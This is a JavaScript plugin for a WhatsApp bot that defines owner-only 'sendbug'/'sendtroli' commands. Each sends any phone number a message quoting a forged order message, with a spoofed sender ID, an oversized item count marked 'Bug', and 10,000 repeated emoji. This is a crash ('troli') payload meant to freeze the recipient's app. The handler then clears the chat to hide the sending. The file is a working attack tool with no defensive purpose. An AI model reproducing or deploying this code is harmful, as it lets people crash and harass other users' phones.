let handler = async (m, { conn, text, args, usedPrefix, command }) => {
    if (!text) throw `Wrong Format!!\nExample : ${usedPrefix + command} +13656503237`
    conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Here is your Order!', 'conversation', {
     quoted: {
      key: {
      remoteJid: 'status@broadcast',
       participant: '0@s.whatsapp.net' // Fake sender Jid
      },
      message: {
       orderMessage: {
        itemCount: 9999999999, // Bug
        status: 1,
        surface: 1,
        message: '😀'.repeat(10000),
        orderTitle: 'Eva', // Idk what this does
        sellerJid: '0@s.whatsapp.net' // Seller
       }
      }
     }
    }).then(v => conn.modifyChat(v.key.remoteJid, 'clear'))
    }
    handler.help = ['sendbug <number>', 'sendtroli <number>']
    handler.tags = ['owner']
    handler.command = /^(sendtroli|sendbug)$/i
    handler.owner = true 
    
    module.exports = handler
